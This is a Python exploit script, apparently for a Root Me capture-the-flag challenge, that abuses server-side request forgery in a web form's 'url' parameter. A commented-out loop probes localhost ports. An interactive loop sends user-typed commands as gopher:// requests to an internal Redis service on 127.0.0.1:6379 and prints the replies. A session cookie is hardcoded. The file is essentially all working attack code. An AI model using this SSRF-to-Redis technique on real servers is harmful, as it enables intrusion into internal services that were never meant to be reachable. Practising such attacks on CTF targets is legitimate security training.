import requests
from bs4 import BeautifulSoup

url = 'http://ctf11.root-me.org/index.php'

myself = '127.0.0.1'
port = 6379
# arr = [22, 25, 80б 6379]

# for port in range(8800, 2**16):
# for port in range(6379, 6380):
#     r = requests.post(url, data={'url': myself + ':' + str(port)})
#     print(port, ': ', end='')
    # if port % 400 == 0:
    #     print(port)
    # if 'Failed' not in r.text:
    #     print('Fail')
    # else:
        # arr.append(port)
        # print(port, ' OK!')
    # print(r.text)
    # input('Press enter...')

# print(arr)

import urllib

cookies={'spip_session':'231934_7c64f2b833d17b3cc0d17ce34b689d6b', 'msg_history':'explication_site_multilingue%3B'}

while True:
    s = input("Enter query:(q)")
    if s == 'q':
        break
    if input('Sure?(y)') != 'y':
        continue
    q = urllib.parse.quote(s)

    qvr = 'gopher://' + myself + ':' + str(port) + '/1' + q
    print(qvr)
    r = requests.post(url, data={"url": qvr}, cookies=cookies)
    # print(r.text)
    sp = BeautifulSoup(r.content, 'lxml')
    print(sp.pre.text)
